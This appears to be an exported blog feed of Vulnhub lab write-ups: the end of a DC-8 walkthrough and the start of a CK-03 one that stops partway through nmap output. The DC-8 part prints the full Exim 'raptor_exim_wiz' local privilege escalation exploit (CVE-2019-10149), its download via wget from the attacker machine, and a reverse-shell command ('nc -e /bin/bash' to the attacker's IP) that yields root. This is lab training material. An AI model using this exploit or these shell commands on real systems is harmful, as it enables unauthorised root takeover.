<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 1234</span></span><br><span class="line">listening on [any] 1234 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>æäº¤è¡¨å•</code></p>
<img src="/2020/08/31/DC-8/image-20200831095803786.png" class>

<p><code>kali get shell</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 1234</span></span><br><span class="line">listening on [any] 1234 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.3] 38376</span><br><span class="line">Linux dc-8 4.9.0-4-amd64 <span class="comment">#1 SMP Debian 4.9.51-1 (2017-09-28) x86_64 GNU/Linux</span></span><br><span class="line"> 11:58:10 up  1:26,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>

<p><code>å‡çº§shell</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@dc-8:/$ </span><br><span class="line"></span><br><span class="line">www-data@dc-8:/$</span><br></pre></td></tr></table></figure>

<p><code>å‡çº§ä¸ºäº¤äº’shell</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-8:/$ ^Z</span><br><span class="line">[1]+  å·²åœæ­¢               nc -nvlp 1234</span><br><span class="line">root@JIYE:~<span class="comment"># stty raw -echo</span></span><br><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 1234</span></span><br><span class="line"></span><br><span class="line">www-data@dc-8:/$ </span><br><span class="line">www-data@dc-8:/$ whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@dc-8:/$ <span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line">www-data@dc-8:/$ </span><br></pre></td></tr></table></figure>

<h2 id="0x10-ææƒ"><a href="#0x10-ææƒ" class="headerlink" title="0x10.ææƒ"></a>0x10.ææƒ</h2><p><code>SUIDææƒï¼Œexim4å…·æœ‰SUIDæ ‡è¯†</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-8:/$ find / -perm -4000 2&gt;/dev/null </span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">www-data@dc-8:/$</span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹exim4ç‰ˆæœ¬ï¼Œä¸º4.89</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-8:/$ exim4 --<span class="built_in">help</span></span><br><span class="line">Exim is a Mail Transfer Agent. It is normally called by Mail User Agents,</span><br><span class="line">not directly from a shell <span class="built_in">command</span> line. Options and/or arguments control</span><br><span class="line">what it does when called. For a list of options, see the Exim documentation.</span><br><span class="line">www-data@dc-8:/$</span><br><span class="line">www-data@dc-8:/$ exim4 --version</span><br><span class="line">Exim version 4.89 <span class="comment">#2 built 14-Jun-2017 05:03:07</span></span><br><span class="line">Copyright (c) University of Cambridge, 1995 - 2017</span><br><span class="line">(c) The Exim Maintainers and contributors <span class="keyword">in</span> ACKNOWLEDGMENTS file, 2007 - 2017</span><br><span class="line">Berkeley DB: Berkeley DB 5.3.28: (September  9, 2013)</span><br><span class="line">Support <span class="keyword">for</span>: crypteq iconv() IPv6 GnuTLS move_frozen_messages DKIM DNSSEC Event OCSP PRDR SOCKS TCP_Fast_Open</span><br><span class="line">Lookups (built-in): lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 passwd</span><br><span class="line">Authenticators: cram_md5 plaintext</span><br><span class="line">Routers: accept dnslookup ipliteral manualroute queryprogram redirect</span><br><span class="line">Transports: appendfile/maildir/mailstore autoreply lmtp pipe smtp</span><br><span class="line">Fixed never_users: 0</span><br><span class="line">Configure owner: 0:0</span><br><span class="line">Size of off_t: 8</span><br><span class="line">Configuration file is /var/lib/exim4/config.autogenerated</span><br><span class="line">www-data@dc-8:/$</span><br></pre></td></tr></table></figure>

<p><code>Google exim4 4.89 exploit</code></p>
<img src="/2020/08/31/DC-8/image-20200831101735507.png" class>

<p><code>å¤åˆ¶æºç </code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># cat exim.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># raptor_exim_wiz - &quot;The Return of the WIZard&quot; LPE exploit</span></span><br><span class="line"><span class="comment"># Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># A flaw was found in Exim versions 4.87 to 4.91 (inclusive). </span></span><br><span class="line"><span class="comment"># Improper validation of recipient address in deliver_message() </span></span><br><span class="line"><span class="comment"># function in /src/deliver.c may lead to remote command execution.</span></span><br><span class="line"><span class="comment"># (CVE-2019-10149)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This is a local privilege escalation exploit for &quot;The Return </span></span><br><span class="line"><span class="comment"># of the WIZard&quot; vulnerability reported by the Qualys Security </span></span><br><span class="line"><span class="comment"># Advisory team.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Credits:</span></span><br><span class="line"><span class="comment"># Qualys Security Advisory team (kudos for your amazing research!)</span></span><br><span class="line"><span class="comment"># Dennis &#x27;dhn&#x27; Herrmann (/dev/tcp technique)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Usage (setuid method):</span></span><br><span class="line"><span class="comment"># $ id</span></span><br><span class="line"><span class="comment"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span></span><br><span class="line"><span class="comment"># $ ./raptor_exim_wiz -m setuid</span></span><br><span class="line"><span class="comment"># Preparing setuid shell helper...</span></span><br><span class="line"><span class="comment"># Delivering setuid payload...</span></span><br><span class="line"><span class="comment"># [...]</span></span><br><span class="line"><span class="comment"># Waiting 5 seconds...</span></span><br><span class="line"><span class="comment"># -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 /tmp/pwned</span></span><br><span class="line"><span class="comment"># # id</span></span><br><span class="line"><span class="comment"># uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Usage (netcat method):</span></span><br><span class="line"><span class="comment"># $ id</span></span><br><span class="line"><span class="comment"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span></span><br><span class="line"><span class="comment"># $ ./raptor_exim_wiz -m netcat</span></span><br><span class="line"><span class="comment"># Delivering netcat payload...</span></span><br><span class="line"><span class="comment"># Waiting 5 seconds...</span></span><br><span class="line"><span class="comment"># localhost [127.0.0.1] 31337 (?) open</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="comment"># uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Vulnerable platforms:</span></span><br><span class="line"><span class="comment"># Exim 4.87 - 4.91</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Tested against:</span></span><br><span class="line"><span class="comment"># Exim 4.89 on Debian GNU/Linux 9 (stretch) [exim-4.89.tar.xz]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">METHOD=<span class="string">&quot;setuid&quot;</span> <span class="comment"># default method</span></span><br><span class="line">PAYLOAD_SETUID=<span class="string">&#x27;$&#123;run&#123;\x2fbin\x2fsh\t-c\t\x22chown\troot\t\x2ftmp\x2fpwned\x3bchmod\t4755\t\x2ftmp\x2fpwned\x22&#125;&#125;@localhost&#x27;</span></span><br><span class="line">PAYLOAD_NETCAT=<span class="string">&#x27;$&#123;run&#123;\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31337\t-e\t\x2fbin\x2fsh\x22&#125;&#125;@localhost&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># usage instructions</span></span><br><span class="line"><span class="keyword">function</span> usage()</span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$0</span> [-m METHOD]&quot;</span></span><br><span class="line">        <span class="built_in">echo</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;-m setuid : use the setuid payload (default)&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;-m netcat : use the netcat payload&quot;</span></span><br><span class="line">        <span class="built_in">echo</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload delivery</span></span><br><span class="line"><span class="keyword">function</span> exploit()</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment"># connect to localhost:25</span></span><br><span class="line">        <span class="built_in">exec</span> 3&lt;&gt;/dev/tcp/localhost/25</span><br><span class="line"></span><br><span class="line">        <span class="comment"># deliver the payload</span></span><br><span class="line">        <span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;helo localhost&quot;</span> &gt;&amp;3</span><br><span class="line">        <span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;mail from:&lt;&gt;&quot;</span> &gt;&amp;3</span><br><span class="line">        <span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;rcpt to:&lt;<span class="variable">$PAYLOAD</span>&gt;&quot;</span> &gt;&amp;3</span><br><span class="line">        <span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;data&quot;</span> &gt;&amp;3</span><br><span class="line">        <span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..31&#125;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;Received: <span class="variable">$i</span>&quot;</span> &gt;&amp;3</span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;.&quot;</span> &gt;&amp;3</span><br><span class="line">        <span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;quit&quot;</span> &gt;&amp;3</span><br><span class="line">        <span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># print banner</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;raptor_exim_wiz - &quot;The Return of the WIZard&quot; LPE exploit&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># parse command line</span></span><br><span class="line"><span class="keyword">while</span> [ ! -z <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]; <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">                -m) <span class="built_in">shift</span>; METHOD=<span class="string">&quot;<span class="variable">$1</span>&quot;</span>; <span class="built_in">shift</span>;;</span><br><span class="line">                * ) usage</span><br><span class="line">                ;;</span><br><span class="line">        <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$METHOD</span> ]; <span class="keyword">then</span></span><br><span class="line">        usage</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setuid method</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$METHOD</span> = <span class="string">&quot;setuid&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># prepare a setuid shell helper to circumvent bash checks</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Preparing setuid shell helper...&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;main()&#123;setuid(0);setgid(0);system(\&quot;/bin/sh\&quot;);&#125;&quot;</span> &gt;/tmp/pwned.c</span><br><span class="line">        gcc -o /tmp/pwned /tmp/pwned.c 2&gt;/dev/null</span><br><span class="line">        <span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;Problems compiling setuid shell helper, check your gcc.&quot;</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;Falling back to the /bin/sh method.&quot;</span></span><br><span class="line">                cp /bin/sh /tmp/pwned</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        <span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># select and deliver the payload</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Delivering <span class="variable">$METHOD</span> payload...&quot;</span></span><br><span class="line">        PAYLOAD=<span class="variable">$PAYLOAD_SETUID</span></span><br><span class="line">        exploit</span><br><span class="line">        <span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># wait for the magic to happen and spawn our shell</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Waiting 5 seconds...&quot;</span></span><br><span class="line">        sleep 5</span><br><span class="line">        ls -l /tmp/pwned</span><br><span class="line">        /tmp/pwned</span><br><span class="line"></span><br><span class="line"><span class="comment"># netcat method</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$METHOD</span> = <span class="string">&quot;netcat&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># select and deliver the payload</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Delivering <span class="variable">$METHOD</span> payload...&quot;</span></span><br><span class="line">        PAYLOAD=<span class="variable">$PAYLOAD_NETCAT</span></span><br><span class="line">        exploit</span><br><span class="line">        <span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># wait for the magic to happen and spawn our shell</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Waiting 5 seconds...&quot;</span></span><br><span class="line">        sleep 5</span><br><span class="line">        nc -v 127.0.0.1 31337</span><br><span class="line"></span><br><span class="line"><span class="comment"># print help</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        usage</span><br><span class="line">fid</span><br><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>ä¸Šä¼ exp</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># ls</span></span><br><span class="line">exim.sh  nmap.demo  nmap.sP  re.php  user.txt</span><br><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">192.168.1.3 - - [30/Aug/2020 22:26:17] <span class="string">&quot;GET /exim.exp HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-8:/tmp$ wget http://192.168.1.6/exim.sh</span><br><span class="line">--2020-08-31 12:26:18--  http://192.168.1.6/exim.sh</span><br><span class="line">Connecting to 192.168.1.6:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3547 (3.5K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;exim.exp&#x27;</span></span><br><span class="line"></span><br><span class="line">exim.exp            100%[===================&gt;]   3.46K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-08-31 12:26:18 (111 MB/s) - <span class="string">&#x27;exim.exp&#x27;</span> saved [3547/3547]</span><br><span class="line"></span><br><span class="line">www-data@dc-8:/tmp$ ls</span><br><span class="line">exim.sh</span><br></pre></td></tr></table></figure>

<p><code>æ‰§è¡Œ</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@dc-8:/tmp$ ./exim.sh </span><br><span class="line"></span><br><span class="line">raptor_exim_wiz - <span class="string">&quot;The Return of the WIZard&quot;</span> LPE exploit</span><br><span class="line">Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span><br><span class="line"></span><br><span class="line">Preparing setuid shell helper...</span><br><span class="line">Problems compiling setuid shell helper, check your gcc.</span><br><span class="line">Falling back to the /bin/sh method.</span><br><span class="line"></span><br><span class="line">Delivering setuid payload...</span><br><span class="line">220 dc-8 ESMTP Exim 4.89 Mon, 31 Aug 2020 12:48:46 +1000</span><br><span class="line">250 dc-8 Hello localhost [::1]</span><br><span class="line">250 OK</span><br><span class="line">250 Accepted</span><br><span class="line">354 Enter message, ending with <span class="string">&quot;.&quot;</span> on a line by itself</span><br><span class="line">250 OK id=1kCZsE-0000Ie-4N</span><br><span class="line">221 dc-8 closing connection</span><br><span class="line"></span><br><span class="line">Waiting 5 seconds...</span><br><span class="line">-rwxr-xr-x 1 www-data www-data 117208 Aug 31 12:48 /tmp/pwned</span><br><span class="line">$ </span><br></pre></td></tr></table></figure>

<p><code>å¸¦å‚æ•°æ‰§è¡Œ</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./exim.sh -m netcat</span><br><span class="line"></span><br><span class="line">raptor_exim_wiz - <span class="string">&quot;The Return of the WIZard&quot;</span> LPE exploit</span><br><span class="line">Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span><br><span class="line"></span><br><span class="line">Delivering netcat payload...</span><br><span class="line">220 dc-8 ESMTP Exim 4.89 Mon, 31 Aug 2020 12:50:17 +1000</span><br><span class="line">250 dc-8 Hello localhost [::1]</span><br><span class="line">250 OK</span><br><span class="line">250 Accepted</span><br><span class="line">354 Enter message, ending with <span class="string">&quot;.&quot;</span> on a line by itself</span><br><span class="line">250 OK id=1kCZth-0000Ix-1C</span><br><span class="line">221 dc-8 closing connection</span><br><span class="line"></span><br><span class="line">Waiting 5 seconds...</span><br><span class="line">localhost [127.0.0.1] 31337 (?) open</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>kaliç›‘å¬</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>åå¼¹shell</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Waiting 5 seconds...</span><br><span class="line">localhost [127.0.0.1] 31337 (?) open</span><br><span class="line">nc -e /bin/bash 192.168.1.6 6666</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.3] 59564</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=113(Debian-exim) groups=113(Debian-exim)</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">ls</span><br><span class="line">flag.txt</span><br><span class="line">cat flag.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Brilliant - you have succeeded!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888</span><br><span class="line">888   o   888          888 888      888  <span class="string">&quot;Y88b                            888 888 888 888</span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888</span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888</span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;</span><span class="string">&quot;88b 888 &quot;</span>88b d8P  Y8b 888 888 888 888</span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P</span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      <span class="string">&quot;   &quot;</span>   <span class="string">&quot;   &quot;</span></span><br><span class="line">888P     Y888  <span class="string">&quot;Y8888  888 888      8888888P&quot;</span>   <span class="string">&quot;Y88P&quot;</span>  888  888  <span class="string">&quot;Y8888  888 888 888 888</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those</span></span><br><span class="line"><span class="string">who have provided feedback, and all those who have taken the time to complete these little</span></span><br><span class="line"><span class="string">challenges.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I&#x27;m also sending out an especially big thanks to:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@4nqr34z</span></span><br><span class="line"><span class="string">@D4mianWayne</span></span><br><span class="line"><span class="string">@0xmzfr</span></span><br><span class="line"><span class="string">@theart42</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This challenge was largely based on two things:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.</span></span><br><span class="line"><span class="string">2. A suggestion from @theart42</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The answer to that question is...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>vulnhub</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>CK-03</title>
    <url>/2020/09/26/CK-03/</url>
    <content><![CDATA[<h2 id="0x00å®˜ç½‘æè¿°"><a href="#0x00å®˜ç½‘æè¿°" class="headerlink" title="0x00å®˜ç½‘æè¿°"></a>0x00å®˜ç½‘æè¿°</h2><blockquote>
<p>This box is upgraded edition of previous (MyFileServer 2) box.</p>
<p>Multiple way to get user and root flags are added.</p>
<p>Ping me on twitter @CyberKnight00 if you face any difficulty.</p>
<p>Donâ€™t stop after finding 1 way there are more ways.</p>
<p>This works better with VirtualBox than VMware.</p>
</blockquote>
<a id="more"></a>

<h2 id="0x01-ä¸»æœºæ‰«æ"><a href="#0x01-ä¸»æœºæ‰«æ" class="headerlink" title="0x01.ä¸»æœºæ‰«æ"></a>0x01.ä¸»æœºæ‰«æ</h2><p><code>æ ¹æ®MACåœ°å€å¾—åˆ°ç›®æ ‡ä¸»æœºä¸º192.168.1.14</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# nmap -sP 192.168.1.0/24 -oN nmap.sP</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 15:59 EDT</span><br><span class="line">Nmap scan report for 192.168.1.1</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:01 (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.14</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line">MAC Address: 00:0C:29:D5:67:2B (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.20</span><br><span class="line">Host is up (0.000063s latency).</span><br><span class="line">MAC Address: 00:50:56:FB:E6:6D (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.10</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 28.04 seconds</span><br></pre></td></tr></table></figure>

<h2 id="0x02-ç«¯å£æ‰«æ"><a href="#0x02-ç«¯å£æ‰«æ" class="headerlink" title="0x02.ç«¯å£æ‰«æ"></a>0x02.ç«¯å£æ‰«æ</h2><p><code>å¾—åˆ°ä»¥ä¸‹ç«¯å£ï¼Œå¯ä»¥çœ‹åˆ°ftpç«¯å£å…è®¸anonymousç™»å…¥</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# nmap -sC -sV -sT 192.168.1.14 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 16:09 EDT</span><br><span class="line">Nmap scan report for 192.168.1.14</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 992 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 3.0.2</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx    3 0        0              16 Feb 19  2020 pub [NSE: writeable]</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.1.10</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.2 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 75:fa:37:d1:62:4a:15:87:7e:21:83:b9:2f:ff:04:93 (RSA)</span><br><span class="line">|   256 b8:db:2c:ca:e2:70:c3:eb:9a:a8:cc:0e:a2:1c:68:6b (ECDSA)</span><br><span class="line">|_  256 66:a3:1b:55:ca:c2:51:84:41:21:7f:77:40:45:d4:9f (ED25519)</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.6 ((CentOS))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/2.4.6 (CentOS)</span><br><span class="line">|_http-title: My File Server</span><br><span class="line">111/tcp  open  rpcbind     2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service                                                                                                                   </span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind                                                                                                                   </span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind                                                                                                                   </span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind                                                                                                                   </span><br><span class="line">|   100000  3,4          111/udp6  rpcbind                                                                                                                   </span><br><span class="line">|   100003  3,4         2049/tcp   nfs                                                                                                                       </span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100003  3,4         2049/udp   nfs</span><br><span class="line">|   100003  3,4         2049/udp6  nfs</span><br><span class="line">|   100005  1,2,3      20048/tcp   mountd</span><br><span class="line">|   100005  1,2,3      20048/tcp6  mountd</span><br><span class="line">|   100005  1,2,3      20048/udp   mountd</span><br><span class="line">|   100005  1,2,3      20048/udp6  mountd</span><br><span class="line">|   100021  1,3,4      43810/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      44598/udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      47781/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      52409/udp   nlockmgr</span><br><span class="line">|   100024  1          35697/tcp6  status</span><br><span class="line">|   100024  1          38764/tcp   status</span><br><span class="line">|   100024  1          40593/udp6  status</span><br><span class="line">|   100024  1          54638/udp   status</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049/udp   nfs_acl</span><br><span class="line">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.9.1 (workgroup: SAMBA)</span><br><span class="line">2049/tcp open  nfs_acl     3 